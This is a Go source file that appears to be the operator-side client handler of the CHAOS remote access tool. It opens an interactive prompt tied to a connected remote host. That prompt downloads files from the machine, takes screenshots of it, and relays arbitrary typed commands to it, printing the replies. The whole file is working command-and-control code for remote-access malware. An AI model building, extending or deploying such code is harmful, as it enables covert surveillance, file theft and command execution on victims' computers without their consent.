package client

import (
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/tiagorlampert/CHAOS/internal/handler"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"github.com/tiagorlampert/CHAOS/internal/util/ui/completer"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"net"
	"strings"
)

type ClientHandler struct {
	Connection net.Conn
	UseCase    *usecase.UseCase
}

func NewClientHandler(conn net.Conn, useCase *usecase.UseCase) handler.Client {
	return &ClientHandler{
		Connection: conn,
		UseCase:    useCase,
	}
}

func (c ClientHandler) HandleConnection(hostname, user string) {
	p := prompt.New(
		c.executor,
		completer.ClientCompleter,
		prompt.OptionPrefix(fmt.Sprintf("%s@%s > ", hostname, user)),
		prompt.OptionPrefixTextColor(prompt.Yellow),
	)
	p.Run()
}

func (c ClientHandler) executor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch strings.TrimSpace(v) {
		case "download":
			c.UseCase.Download.Validate(values)
			c.UseCase.Download.Prepare(values[0])
			c.UseCase.Download.File(values[1])
			return
		case "screenshot":
			c.UseCase.Screenshot.TakeScreenshot(input)
			return
		case "exit":
			system.QuitApp()
		default:
			_ = network.Send(c.Connection, []byte(input))
			response, _ := network.Read(c.Connection)
			fmt.Println(string(response))
			return
		}
	}
}
